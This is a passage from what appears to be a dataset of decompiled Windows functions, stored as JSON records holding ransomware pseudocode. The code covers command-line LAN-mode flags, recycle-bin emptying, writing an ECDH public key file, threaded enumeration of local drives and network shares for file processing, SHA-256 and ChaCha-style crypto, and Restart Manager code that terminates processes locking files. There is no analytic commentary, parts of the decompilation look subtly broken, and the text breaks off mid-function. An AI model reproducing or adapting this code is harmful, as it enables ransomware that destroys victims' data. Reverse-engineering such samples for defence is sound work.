CloseHandle(fileHandle); \n            }\n        }\n        FUN_00404f90(filePath); \n    }\n    ___security_check_cookie_4(stackProtection ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_004048a0", "Address": "004048a0", "Source Code": "undefined4 FUN_004048a0(LPCWSTR inputString)\n{\n    \n    FUN_00404620(inputString, 0);\n    \n    \n    FUN_00404f90(inputString);\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_004048d0", "Address": "004048d0", "Source Code": "void __cdecl FUN_004048d0(LPNETRESOURCEW netResource)\n{\n    HANDLE resourceHandle; \n    DWORD bufferSize = 0x4000; \n    uint resourceCount = 0xffffffff; \n    DWORD enumResult = openResourceEnum(2, 0, 0x13, netResource, &resourceHandle); \n    if (enumResult == 0) { \n        LPVOID resourceBuffer = allocateBuffer(bufferSize); \n        if (resourceBuffer != NULL) { \n            while ((enumResult = enumerateResources(resourceHandle, &resourceCount, resourceBuffer, &bufferSize)) == 0) { \n                for (uint i = 0; i < resourceCount; i++) { \n                    if ((*(uint *)((int)resourceBuffer + i * 0x20 + 0xc) & 2) == 0) { \n                        processResource(*(LPCWSTR *)((int)resourceBuffer + i * 0x20 + 0x14), 0); \n                    } else { \n                        FUN_004048d0((LPNETRESOURCEW)(i * 0x20 + (int)resourceBuffer)); \n                    }\n                }\n            }\n            freeBuffer(resourceBuffer); \n        }\n        closeResourceEnum(resourceHandle); \n    }\n    return; \n}"}
{"Function Name": "entry", "Address": "004049c0", "Source Code": "void entry(void)\n{\n    LPSTR commandLineArgs; \n    HGLOBAL globalMemoryHandle; \n    int stringComparisonResult; \n    HANDLE *threadHandles; \n    HANDLE fileOrThreadHandle; \n    LPWSTR drivePath; \n    UINT driveType; \n    LPWSTR remoteName; \n    DWORD networkConnectionResult; \n    DWORD logicalDrives; \n    int commandLineArgCount; \n    WCHAR appDataPathBuffer[260]; \n    uint activeThreadCounter = 0; \n    DWORD fileWriteSize; \n    commandLineArgs = GetCommandLineA(); \n    globalMemoryHandle = FUN_004025a0(commandLineArgs, &commandLineArgCount); \n    \n    if (commandLineArgCount > 1) { \n        for (int argIndex = 1; argIndex < commandLineArgCount; argIndex++) { \n            stringComparisonResult = lstrcmpA(*(LPCSTR *)((int)globalMemoryHandle + 4), \"-lanfirst\"); \n            if (stringComparisonResult == 0) { \n                commandLineArgCount = 1; \n            } else {\n                stringComparisonResult = lstrcmpA(*(LPCSTR *)((int)globalMemoryHandle + 4), \"-lansecond\"); \n                if (stringComparisonResult == 0) { \n                    commandLineArgCount = 0; \n                } else {\n                    stringComparisonResult = lstrcmpA(*(LPCSTR *)((int)globalMemoryHandle + 4), \"-nolan\"); \n                    if (stringComparisonResult == 0) { \n                        commandLineArgCount = -1; \n                    }\n                }\n            }\n        }\n    }\n    \n    SetProcessShutdownParameters(0, 0); \n    FUN_00404f80(); \n    FUN_00402ae0(); \n    FUN_00402d30(); \n    FUN_00402a30(); \n    SHEmptyRecycleBinA(0, 0, 7); \n    \n    _SYSTEM_INFO systemInfo; \n    GetSystemInfo(&systemInfo); \n    \n    threadHandles = (HANDLE *)FUN_00404fc0(systemInfo.dwNumberOfProcessors << 3); \n    if (threadHandles != (HANDLE *)0x0) { \n        FUN_004034b0(); \n        FUN_00403420(0x408230, 0x48); \n        FUN_004034f0(0x408278, (uint *)&DAT_00408230); \n        FUN_00403590((uint *)&DAT_00408230, 0x401bb8, 0x408308); \n        FUN_004053a0(&DAT_00408398, &DAT_00408308, 0x48); \n        FUN_004053a0(&DAT_004083b8, &DAT_00408308, 0x90); \n        und_memcpy(&DAT_004083d8, &DAT_00408308, 0xc); \n        \n        GetEnvironmentVariableW(L\"APPDATA\", appDataPathBuffer, 0xf4); \n        lstrcatW(appDataPathBuffer, L\"\\\\ecdh_pub_k.bin\"); \n        fileWriteSize = 0; \n        fileOrThreadHandle = CreateFileW(appDataPathBuffer, 0x40000000, 1, (LPSECURITY_ATTRIBUTES)0x0, 1, 0x80, (HANDLE)0x0); \n        \n        if (fileOrThreadHandle != (HANDLE)0xffffffff) { \n            WriteFile(fileOrThreadHandle, &DAT_00408278, 0x90, &fileWriteSize, (LPOVERLAPPED)0x0); \n            CloseHandle(fileOrThreadHandle); \n            if (commandLineArgCount != 0) { \n                FUN_004048d0((LPNETRESOURCEW)0x0); \n            }\n            FUN_00402770(); \n            logicalDrives = GetLogicalDrives(); \n            if (logicalDrives != 0) { \n                for (WCHAR driveLetter = L'A'; (ushort)driveLetter < 0x5b; driveLetter++) { \n                    if ((logicalDrives & 1) != 0) { \n                        if (systemInfo.dwNumberOfProcessors << 1 <= activeThreadCounter) { \n                            WaitForMultipleObjects(activeThreadCounter, threadHandles, 1, 0xffffffff); \n                            for (uint activeThreadIndex = 0; activeThreadIndex < activeThreadCounter; activeThreadIndex++) { \n                                CloseHandle(threadHandles[activeThreadIndex]); \n                            }\n                            activeThreadCounter = 0; \n                        }\n                        drivePath = (LPWSTR)FUN_00404fc0(0xe); \n                        lstrcpyW(drivePath, L\"\\\\\\\\?\\\\\"); \n                        lstrcpyW(drivePath + 5, L\":\"); \n                        drivePath[4] = driveLetter; \n                        driveType = GetDriveTypeW(drivePath); \n                        if (driveType == 0 || driveType == 5) { \n                            FUN_00404f90(drivePath); \n                        } else if (driveType == 4) { \n                            DWORD remoteNameBufferSize = 0x104; \n                            remoteName = (LPWSTR)FUN_00404fc0(0x208); \n                            if (remoteName != (LPWSTR)0x0 && (networkConnectionResult = WNetGetConnectionW(drivePath + 4, remoteName, &remoteNameBufferSize), networkConnectionResult == 0)) { \n                                fileOrThreadHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0, 0, FUN_004048a0, remoteName, 0, (LPDWORD)0x0); \n                                threadHandles[activeThreadCounter++] = fileOrThreadHandle; \n                            }\n                            FUN_00404f90(drivePath); \n                        } else { \n                            fileOrThreadHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0, 0, FUN_004048a0, drivePath, 0, (LPDWORD)0x0); \n                            threadHandles[activeThreadCounter++] = fileOrThreadHandle; \n                        }\n                    }\n                    logicalDrives = logicalDrives >> 1; \n                }\n            }\n            if (commandLineArgCount == 0) { \n                FUN_004048d0((LPNETRESOURCEW)0x0); \n            }\n            WaitForMultipleObjects(activeThreadCounter, threadHandles, 1, 0xffffffff); \n            for (uint local_260 = 0; local_260 < activeThreadCounter; local_260++) { \n                CloseHandle(threadHandles[local_260]); \n            }\n        }\n        FUN_00404f90(threadHandles); \n    }\n    FUN_00402a30(); \n    ExitProcess(0); \n}"}
{"Function Name": "FUN_00404f80", "Address": "00404f80", "Source Code": "void FUN_00404f80(void)\n{\n    \n    InitializeCriticalSection((LPCRITICAL_SECTION)&criticalSectionObject);\n}"}
{"Function Name": "FUN_00404fc0", "Address": "00404fc0", "Source Code": "LPVOID __cdecl FUN_00404fc0(int requestedSize)\n{\n    HANDLE heapHandle; \n    LPVOID allocatedMemory; \n    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004083e4); \n    allocatedMemory = HeapAlloc(GetProcessHeap(), 8, requestedSize + 0x40); \n    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004083e4); \n    return allocatedMemory; \n}"}
{"Function Name": "FUN_00405110", "Address": "00405110", "Source Code": "void __cdecl FUN_00405110(undefined4 *constants_array)\n{\n    \n    constants_array[0] = 0x6a09e667; \n    \n    constants_array[1] = 0xbb67ae85; \n    \n    constants_array[2] = 0x3c6ef372; \n    \n    constants_array[3] = 0xa54ff53a; \n    \n    constants_array[4] = 0x510e527f; \n    \n    constants_array[5] = 0x9b05688c; \n    \n    constants_array[6] = 0x1f83d9ab; \n    \n    constants_array[7] = 0x5be0cd19; \n    \n    constants_array[8] = 0; \n    \n    constants_array[9] = 0; \n}"}
{"Function Name": "FUN_004053a0", "Address": "004053a0", "Source Code": "void __cdecl FUN_004053a0(undefined *input_data_1, undefined *input_data_2, int input_count)\n{\n    uint data_array[26]; \n    FUN_00405110(data_array); \n    FUN_004051c0(data_array, input_data_2, input_count); \n    FUN_00405240(data_array, input_data_1); \n    ___security_check_cookie_4(DAT_004081b0 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_004053f0", "Address": "004053f0", "Source Code": "void FUN_004053f0(uint *param_1, uint *param_2)\n{\n    uint result1, result2, result3, result4, result5, result7, result8, result9; \n    int tempInt; \n    \n    uint value1 = *param_1;\n    uint value2 = param_1[1];\n    uint value3 = param_1[2];\n    uint value4 = param_1[3];\n    uint value5 = param_1[4];\n    uint value6 = param_1[5];\n    uint value7 = param_1[6];\n    uint value8 = param_1[7];\n    \n    uint stackValue1, stackValue2, stackValue3, stackValue4, stackValue5, stackValue6, stackValue7, stackValue8, stackValue9, stackValue10, stackValue11, stackValue12, stackValue13, stackValue14;\n    \n    for (uint loopIndex = 0; loopIndex < 0x40; loopIndex += 0x10) {\n        \n        if (loopIndex == 0) {\n            stackValue1 = *param_2; \n        } else {\n            \n            stackValue1 += ((uStack_30 << 0xf | uStack_30 >> 0x11) ^ (uStack_30 << 0xd | uStack_30 >> 0x13) ^ uStack_30 >> 10) + stackValue10 + ((stackValue2 << 0x19 | stackValue2 >> 7) ^ (stackValue2 << 0xe | stackValue2 >> 0x12) ^ stackValue2 >> 3);\n        }\n        \n        tempInt = ((value5 << 0x1a | value5 >> 6) ^ (value5 << 0x15 | value5 >> 0xb) ^ (value5 << 7 | value5 >> 0x19)) + ((value6 ^ value7) & value5 ^ value7) + *(int *)(&DAT_004022c8 + loopIndex * 4) + stackValue1 + value8;\n        value4 += tempInt; \n        \n        result2 = (value1 & value2 | (value1 | value2) & value3) + tempInt + ((value1 << 0x1e | value1 >> 2) ^ (value1 << 0x13 | value1 >> 0xd) ^ (value1 << 10 | value1 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue2 = param_2[1]; \n        } else {\n            \n            stackValue2 += ((uStack_2c << 0xf | uStack_2c >> 0x11) ^ (uStack_2c << 0xd | uStack_2c >> 0x13) ^ uStack_2c >> 10) + stackValue11 + ((stackValue3 << 0x19 | stackValue3 >> 7) ^ (stackValue3 << 0xe | stackValue3 >> 0x12) ^ stackValue3 >> 3);\n        }\n        \n        tempInt = ((value4 * 0x4000000 | value4 >> 6) ^ (value4 * 0x200000 | value4 >> 0xb) ^ (value4 * 0x80 | value4 >> 0x19)) + ((value5 ^ value6) & value4 ^ value6) + *(int *)(&DAT_004022cc + loopIndex * 4) + stackValue2 + value7;\n        value3 += tempInt; \n        \n        result3 = (result2 & value1 | (result2 | value1) & value2) + tempInt + ((result2 * 0x40000000 | result2 >> 2) ^ (result2 * 0x80000 | result2 >> 0xd) ^ (result2 * 0x400 | result2 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue3 = param_2[2]; \n        } else {\n            \n            stackValue3 += ((stackValue1 << 0xf | stackValue1 >> 0x11) ^ (stackValue1 << 0xd | stackValue1 >> 0x13) ^ stackValue1 >> 10) + stackValue12 + ((stackValue4 << 0x19 | stackValue4 >> 7) ^ (stackValue4 << 0xe | stackValue4 >> 0x12) ^ stackValue4 >> 3);\n        }\n        \n        tempInt = ((value3 * 0x4000000 | value3 >> 6) ^ (value3 * 0x200000 | value3 >> 0xb) ^ (value3 * 0x80 | value3 >> 0x19)) + ((value4 ^ value5) & value3 ^ value5) + *(int *)(&DAT_004022d0 + loopIndex * 4) + stackValue3 + value6;\n        value2 += tempInt; \n        \n        result4 = (result3 & result2 | (result3 | result2) & value1) + tempInt + ((result3 * 0x40000000 | result3 >> 2) ^ (result3 * 0x80000 | result3 >> 0xd) ^ (result3 * 0x400 | result3 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue4 = param_2[3]; \n        } else {\n            \n            stackValue4 += ((stackValue2 << 0xf | stackValue2 >> 0x11) ^ (stackValue2 << 0xd | stackValue2 >> 0x13) ^ stackValue2 >> 10) + stackValue13 + ((stackValue5 << 0x19 | stackValue5 >> 7) ^ (stackValue5 << 0xe | stackValue5 >> 0x12) ^ stackValue5 >> 3);\n        }\n        \n        tempInt = ((value2 * 0x4000000 | value2 >> 6) ^ (value2 * 0x200000 | value2 >> 0xb) ^ (value2 * 0x80 | value2 >> 0x19)) + ((value3 ^ value4) & value2 ^ value4) + *(int *)(&DAT_004022d4 + loopIndex * 4) + stackValue4 + value5;\n        value1 += tempInt; \n        \n        result7 = (result4 & result3 | (result4 | result3) & result2) + tempInt + ((result4 * 0x40000000 | result4 >> 2) ^ (result4 * 0x80000 | result4 >> 0xd) ^ (result4 * 0x400 | result4 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue5 = param_2[4]; \n        } else {\n            \n            stackValue5 += ((stackValue3 << 0xf | stackValue3 >> 0x11) ^ (stackValue3 << 0xd | stackValue3 >> 0x13) ^ stackValue3 >> 10) + stackValue14 + ((stackValue6 << 0x19 | stackValue6 >> 7) ^ (stackValue6 << 0xe | stackValue6 >> 0x12) ^ stackValue6 >> 3);\n        }\n        \n        tempInt = ((value1 * 0x4000000 | value1 >> 6) ^ (value1 * 0x200000 | value1 >> 0xb) ^ (value1 * 0x80 | value1 >> 0x19)) + ((value2 ^ value3) & value1 ^ value3) + *(int *)(&DAT_004022d8 + loopIndex * 4) + stackValue5 + value4;\n        result2 += tempInt; \n        \n        result8 = (result7 & result4 | (result7 | result4) & result3) + tempInt + ((result7 * 0x40000000 | result7 >> 2) ^ (result7 * 0x80000 | result7 >> 0xd) ^ (result7 * 0x400 | result7 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue6 = param_2[5]; \n        } else {\n            \n            stackValue6 += ((stackValue4 << 0xf | stackValue4 >> 0x11) ^ (stackValue4 << 0xd | stackValue4 >> 0x13) ^ stackValue4 >> 10) + uStack_30 + ((stackValue7 << 0x19 | stackValue7 >> 7) ^ (stackValue7 << 0xe | stackValue7 >> 0x12) ^ stackValue7 >> 3);\n        }\n        \n        tempInt = ((result2 * 0x4000000 | result2 >> 6) ^ (result2 * 0x200000 | result2 >> 0xb) ^ (result2 * 0x80 | result2 >> 0x19)) + ((value1 ^ value2) & result2 ^ value2) + *(int *)(&DAT_004022dc + loopIndex * 4) + stackValue6 + value3;\n        result3 += tempInt; \n        \n        result1 = (result8 & result7 | (result8 | result7) & result4) + tempInt + ((result8 * 0x40000000 | result8 >> 2) ^ (result8 * 0x80000 | result8 >> 0xd) ^ (result8 * 0x400 | result8 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue7 = param_2[6]; \n        } else {\n            \n            stackValue7 += ((stackValue5 << 0xf | stackValue5 >> 0x11) ^ (stackValue5 << 0xd | stackValue5 >> 0x13) ^ stackValue5 >> 10) + uStack_2c + ((stackValue8 << 0x19 | stackValue8 >> 7) ^ (stackValue8 << 0xe | stackValue8 >> 0x12) ^ stackValue8 >> 3);\n        }\n        \n        tempInt = ((result3 * 0x4000000 | result3 >> 6) ^ (result3 * 0x200000 | result3 >> 0xb) ^ (result3 * 0x80 | result3 >> 0x19)) + ((result2 ^ value1) & result3 ^ value1) + *(int *)(&DAT_004022e0 + loopIndex * 4) + stackValue7 + value2;\n        result4 += tempInt; \n        \n        result5 = (result1 & result8 | (result1 | result8) & result7) + tempInt + ((result1 * 0x40000000 | result1 >> 2) ^ (result1 * 0x80000 | result1 >> 0xd) ^ (result1 * 0x400 | result1 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue8 = param_2[7]; \n        } else {\n            \n            stackValue8 += ((stackValue6 << 0xf | stackValue6 >> 0x11) ^ (stackValue6 << 0xd | stackValue6 >> 0x13) ^ stackValue6 >> 10) + stackValue1 + ((stackValue9 << 0x19 | stackValue9 >> 7) ^ (stackValue9 << 0xe | stackValue9 >> 0x12) ^ stackValue9 >> 3);\n        }\n        \n        tempInt = ((result4 * 0x4000000 | result4 >> 6) ^ (result4 * 0x200000 | result4 >> 0xb) ^ (result4 * 0x80 | result4 >> 0x19)) + ((result3 ^ result2) & result4 ^ result2) + *(int *)(&DAT_004022e4 + loopIndex * 4) + stackValue8 + value1;\n        result7 += tempInt; \n        \n        result9 = (result5 & result1 | (result5 | result1) & result8) + tempInt + ((result5 * 0x40000000 | result5 >> 2) ^ (result5 * 0x80000 | result5 >> 0xd) ^ (result5 * 0x400 | result5 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue9 = param_2[8]; \n        } else {\n            \n            stackValue9 += ((stackValue7 << 0xf | stackValue7 >> 0x11) ^ (stackValue7 << 0xd | stackValue7 >> 0x13) ^ stackValue7 >> 10) + stackValue2 + ((stackValue10 << 0x19 | stackValue10 >> 7) ^ (stackValue10 << 0xe | stackValue10 >> 0x12) ^ stackValue10 >> 3);\n        }\n        \n        tempInt = ((result7 * 0x4000000 | result7 >> 6) ^ (result7 * 0x200000 | result7 >> 0xb) ^ (result7 * 0x80 | result7 >> 0x19)) + ((result4 ^ result3) & result7 ^ result3) + *(int *)(&DAT_004022e8 + loopIndex * 4) + stackValue9 + result2;\n        result8 += tempInt; \n        \n        value8 = (result9 & result5 | (result9 | result5) & result1) + tempInt + ((result9 * 0x40000000 | result9 >> 2) ^ (result9 * 0x80000 | result9 >> 0xd) ^ (result9 * 0x400 | result9 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue10 = param_2[9]; \n        } else {\n            \n            stackValue10 += ((stackValue8 << 0xf | stackValue8 >> 0x11) ^ (stackValue8 << 0xd | stackValue8 >> 0x13) ^ stackValue8 >> 10) + stackValue3 + ((stackValue11 << 0x19 | stackValue11 >> 7) ^ (stackValue11 << 0xe | stackValue11 >> 0x12) ^ stackValue11 >> 3);\n        }\n        \n        tempInt = ((result8 * 0x4000000 | result8 >> 6) ^ (result8 * 0x200000 | result8 >> 0xb) ^ (result8 * 0x80 | result8 >> 0x19)) + ((result7 ^ result4) & result8 ^ result4) + *(int *)(&DAT_004022ec + loopIndex * 4) + stackValue10 + result3;\n        result1 += tempInt; \n        \n        value7 = (value8 & result9 | (value8 | result9) & result5) + tempInt + ((value8 * 0x40000000 | value8 >> 2) ^ (value8 * 0x80000 | value8 >> 0xd) ^ (value8 * 0x400 | value8 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue11 = param_2[10]; \n        } else {\n            \n            stackValue11 += ((stackValue9 << 0xf | stackValue9 >> 0x11) ^ (stackValue9 << 0xd | stackValue9 >> 0x13) ^ stackValue9 >> 10) + stackValue4 + ((stackValue12 << 0x19 | stackValue12 >> 7) ^ (stackValue12 << 0xe | stackValue12 >> 0x12) ^ stackValue12 >> 3);\n        }\n        \n        tempInt = ((result1 * 0x4000000 | result1 >> 6) ^ (result1 * 0x200000 | result1 >> 0xb) ^ (result1 * 0x80 | result1 >> 0x19)) + ((result8 ^ result7) & result1 ^ result7) + *(int *)(&DAT_004022f0 + loopIndex * 4) + stackValue11 + result4;\n        result5 += tempInt; \n        \n        value6 = (value7 & value8 | (value7 | value8) & result9) + tempInt + ((value7 * 0x40000000 | value7 >> 2) ^ (value7 * 0x80000 | value7 >> 0xd) ^ (value7 * 0x400 | value7 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue12 = param_2[0xb]; \n        } else {\n            \n            stackValue12 += ((stackValue10 << 0xf | stackValue10 >> 0x11) ^ (stackValue10 << 0xd | stackValue10 >> 0x13) ^ stackValue10 >> 10) + stackValue5 + ((stackValue13 << 0x19 | stackValue13 >> 7) ^ (stackValue13 << 0xe | stackValue13 >> 0x12) ^ stackValue13 >> 3);\n        }\n        \n        tempInt = ((result5 * 0x4000000 | result5 >> 6) ^ (result5 * 0x200000 | result5 >> 0xb) ^ (result5 * 0x80 | result5 >> 0x19)) + ((result1 ^ result8) & result5 ^ result8) + *(int *)(&DAT_004022f4 + loopIndex * 4) + stackValue12 + result7;\n        result9 += tempInt; \n        \n        value5 = (value6 & value7 | (value6 | value7) & value8) + tempInt + ((value6 * 0x40000000 | value6 >> 2) ^ (value6 * 0x80000 | value6 >> 0xd) ^ (value6 * 0x400 | value6 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue13 = param_2[0xc]; \n        } else {\n            \n            stackValue13 += ((stackValue11 << 0xf | stackValue11 >> 0x11) ^ (stackValue11 << 0xd | stackValue11 >> 0x13) ^ stackValue11 >> 10) + stackValue6 + ((stackValue14 << 0x19 | stackValue14 >> 7) ^ (stackValue14 << 0xe | stackValue14 >> 0x12) ^ stackValue14 >> 3);\n        }\n        \n        tempInt = ((result9 * 0x4000000 | result9 >> 6) ^ (result9 * 0x200000 | result9 >> 0xb) ^ (result9 * 0x80 | result9 >> 0x19)) + ((result5 ^ result1) & result9 ^ result1) + *(int *)(&DAT_004022f8 + loopIndex * 4) + stackValue13 + result8;\n        value8 += tempInt; \n        \n        value4 = (value5 & value6 | (value5 | value6) & value7) + tempInt + ((value5 * 0x40000000 | value5 >> 2) ^ (value5 * 0x80000 | value5 >> 0xd) ^ (value5 * 0x400 | value5 >> 0x16));\n        \n        if (loopIndex == 0) {\n            stackValue14 = param_2[0xd]; \n        } else {\n            \n            stackValue14 += ((stackValue12 << 0xf | stackValue12 >> 0x11) ^ (stackValue12 << 0xd | stackValue12 >> 0x13) ^ stackValue12 >> 10) + stackValue7 + ((uStack_30 << 0x19 | uStack_30 >> 7) ^ (uStack_30 << 0xe | uStack_30 >> 0x12) ^ uStack_30 >> 3);\n        }\n        \n        tempInt = ((value8 * 0x4000000 | value8 >> 6) ^ (value8 * 0x200000 | value8 >> 0xb) ^ (value8 * 0x80 | value8 >> 0x19)) + ((result9 ^ result5) & value8 ^ result5) + *(int *)(&DAT_00402300 + loopIndex * 4) + uStack_30 + result5;\n        value7 += tempInt; \n        \n        value2 = (value3 & value4 | (value3 | value4) & value5) + tempInt + ((value2 * 0x40000000 | value2 >> 2) ^ (value2 * 0x80000 | value2 >> 0xd) ^ (value2 * 0x400 | value2 >> 0x16));\n    }\n    \n    *param_1 += value1; \n    param_1[1] += value2; \n    param_1[2] += value3; \n    param_1[3] += value4; \n    param_1[4] += value5; \n    param_1[5] += value6; \n    param_1[6] += value7; \n    param_1[7] += value8; \n}"}
{"Function Name": "FUN_00407150", "Address": "00407150", "Source Code": "void __cdecl FUN_00407150(uint *input_array)\n{\n    uint processed_values[16]; \n    uint security_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    for (uint index = 0; index < 0x10; index++) {\n        \n        processed_values[index] =\n            (uint)*(byte *)(input_array + index + 10) * 0x1000000 + \n            (uint)*(byte *)((int)input_array + index * 4 + 0x29) * 0x10000 + \n            (uint)*(byte *)((int)input_array + index * 4 + 0x2a) * 0x100 + \n            (uint)*(byte *)((int)input_array + index * 4 + 0x2b); \n    }\n    \n    FUN_004053f0(input_array, processed_values); \n    processed_values[0] = 0x4071d6; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "@__security_check_cookie@4", "Address": "004071ec", "Source Code": "void __fastcall ___security_check_cookie_4(int cookie_value)\n{\n    \n    if (cookie_value != expected_cookie_value) {\n        \n        report_security_failure();\n    }\n}"}
{"Function Name": "MPR.DLL::WNetGetConnectionW", "Address": "00407480", "Source Code": "DWORD WNetGetConnectionW(LPCWSTR localName, LPWSTR remoteName, LPDWORD length)\n{\n    \n    return WNetGetConnectionW(localName, remoteName, length);\n}"}
{"Function Name": "MPR.DLL::WNetOpenEnumW", "Address": "00407486", "Source Code": "DWORD WNetOpenEnumW(DWORD scope, DWORD type, DWORD usage, LPNETRESOURCEW netResource, LPHANDLE enumHandle)\n{\n    \n    return WNetOpenEnumW(scope, type, usage, netResource, enumHandle);\n}"}
{"Function Name": "MPR.DLL::WNetEnumResourceW", "Address": "0040748c", "Source Code": "DWORD WNetEnumResourceW(HANDLE handleEnum, LPDWORD countPointer, LPVOID bufferPointer, LPDWORD bufferSizePointer)\n{\n    \n    return WNetEnumResourceW(handleEnum, countPointer, bufferPointer, bufferSizePointer);\n}"}
{"Function Name": "MPR.DLL::WNetCloseEnum", "Address": "00407492", "Source Code": "DWORD WNetCloseEnum(HANDLE networkHandle)\n{\n    \n    return WNetCloseEnum(networkHandle);\n}"}
{"Function Name": "KERNEL32.DLL::IsProcessorFeaturePresent", "Address": "004074b0", "Source Code": "BOOL IsProcessorFeaturePresent(DWORD featureId)\n{\n    \n    return IsProcessorFeaturePresent(featureId);\n}"}
{"Function Name": "FUN_004030a0", "Address": "004030a0", "Source Code": "uint __cdecl FUN_004030a0(uint input_value, byte shift_amount)\n{\n    \n    \n    \n    return input_value << (shift_amount & 0x1f) | input_value >> ((-shift_amount) & 0x1f);\n}"}
{"Function Name": "FUN_004030c0", "Address": "004030c0", "Source Code": "void __cdecl FUN_004030c0(int array_base, int index_a, int index_b, int index_c, int index_d)\n{\n    uint result; \n    \n    *(int *)(array_base + index_a * 4) += *(int *)(array_base + index_b * 4);\n    \n    \n    result = FUN_004030a0(*(uint *)(array_base + index_d * 4) ^ *(uint *)(array_base + index_a * 4), 0x10);\n    \n    \n    *(uint *)(array_base + index_d * 4) = result;\n    \n    \n    *(int *)(array_base + index_c * 4) += *(int *)(array_base + index_d * 4);\n    \n    \n    result = FUN_004030a0(*(uint *)(array_base + index_b * 4) ^ *(uint *)(array_base + index_c * 4), 0xc);\n    \n    \n    *(uint *)(array_base + index_b * 4) = result;\n    \n    \n    *(int *)(array_base + index_a * 4) += *(int *)(array_base + index_b * 4);\n    \n    \n    result = FUN_004030a0(*(uint *)(array_base + index_d * 4) ^ *(uint *)(array_base + index_a * 4), 8);\n    \n    \n    *(uint *)(array_base + index_d * 4) = result;\n    \n    \n    *(int *)(array_base + index_c * 4) += *(int *)(array_base + index_d * 4);\n    \n    \n    result = FUN_004030a0(*(uint *)(array_base + index_b * 4) ^ *(uint *)(array_base + index_c * 4), 7);\n    \n    \n    *(uint *)(array_base + index_b * 4) = result;\n}"}
{"Function Name": "FUN_004031d0", "Address": "004031d0", "Source Code": "void __cdecl FUN_004031d0(int input_value, int pointer_value)\n{\n    \n    for (int iteration_index = 0; iteration_index < 0x10; iteration_index++) {\n        \n        FUN_00402fc0(*(undefined4 *)(input_value + iteration_index * 4), (undefined *)(pointer_value + iteration_index * 4));\n    }\n}"}
{"Function Name": "__FillZeroMan", "Address": "00403730", "Source Code": "void __cdecl __FillZeroMan(int baseAddress)\n{\n    \n    for (int index = 0; index < 0x12; index++) {\n        \n        *(undefined4 *)(baseAddress + index * 4) = 0;\n    }\n}"}
{"Function Name": "FUN_00403c20", "Address": "00403c20", "Source Code": "void __cdecl FUN_00403c20(int input_value_1, int input_value_2, int input_value_3, int input_value_4)\n{\n    \n    FUN_00403650(input_value_1, input_value_3);\n    \n    \n    FUN_00403650(input_value_2, input_value_4);\n}"}
{"Function Name": "FUN_00403c70", "Address": "00403c70", "Source Code": "undefined4 __cdecl FUN_00403c70(int input_a, int input_b)\n{\n    \n    if (FUN_00403760(input_a) && FUN_00403760(input_b)) {\n        \n        return 1;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00403f70", "Address": "00403f70", "Source Code": "void __cdecl FUN_00403f70(int input_param_1, int input_param_2, uint *data_pointer)\n{\n    uint result_value; \n    uint count; \n    undefined buffer_1[72]; \n    undefined buffer_2[72]; \n    uint stack_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    count = FUN_004037b0(data_pointer); \n    FUN_00403c50((int)buffer_1, (int)buffer_2); \n    \n    while (count-- > 0) { \n        FUN_00403cb0((int)buffer_1, (int)buffer_2); \n        result_value = FUN_00404130((int)data_pointer, count); \n        if (result_value != 0) { \n            FUN_00403d90((int)buffer_1, (int)buffer_2, input_param_1, input_param_2); \n        }\n    }\n    \n    FUN_00403c20(input_param_1, input_param_2, (int)buffer_1, (int)buffer_2); \n    ___security_check_cookie_4(stack_cookie ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "FUN_00404150", "Address": "00404150", "Source Code": "void __cdecl FUN_00404150(LPCWSTR param_1)\n{\nbool bVar1;\nHANDLE pvVar2;\nHANDLE hFileMappingObject;\nLPVOID pvVar3;\nLPWSTR lpString1;\nint iVar4;\nDWORD DVar5;\nundefined8 uVar6;\nlonglong lVar7;\nDWORD local_1ab4;\nuint local_1aac;\nuint local_1aa8;\nundefined8 local_1aa0;\nuint local_1a80;\nLARGE_INTEGER local_1a7c;\nundefined local_1a74 [4];\nundefined local_1a70 [4];\nuint local_1a6c;\nundefined4 local_1a68;\nDWORD local_1a64 [163];\nint aiStack_17d8 [1507];\nundefined local_4c [68];\nuint local_8;\nlocal_8 = DAT_004081b0 ^ (uint)&stack0xfffffffc;\nbVar1 = true;\nSetFileAttributesW(param_1,0x80);\nwhile (pvVar2 = CreateFileW(param_1,0xc0000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0),\npvVar2 == (HANDLE)0xffffffff) {\nif (!bVar1) goto LAB_00404610;\nFUN_00405000((int)local_4c,0,0x42);\niVar4 = RmStartSession();\nif (iVar4 != 0) goto LAB_00404610;\niVar4 = RmRegisterResources(local_1a68,1,&param_1,0,0,0,0);\nif (iVar4 == 0) {\nlocal_1a6c = 10;\niVar4 = RmGetList(local_1a68,local_1a74,&local_1a6c,local_1a64,local_1a70);\nif (iVar4 == 0) {\nfor (local_1a80 = 0; local_1a80 < local_1a6c; local_1a80 = local_1a80 + 1) {\nif (((aiStack_17d8[local_1a80 * 0xa7] != 4) && (aiStack_17d8[local_1a80 * 0xa7] != 1000))\n&& ((DVar5 = GetCurrentProcessId(), DVar5 != local_1a64[local_1a80 * 0xa7] &&\n(pvVar2 = OpenProcess(0x100001,0,local_1a64[local_1a80 * 0xa7]),\npvVar2 != (HANDLE)0xffffffff)))) 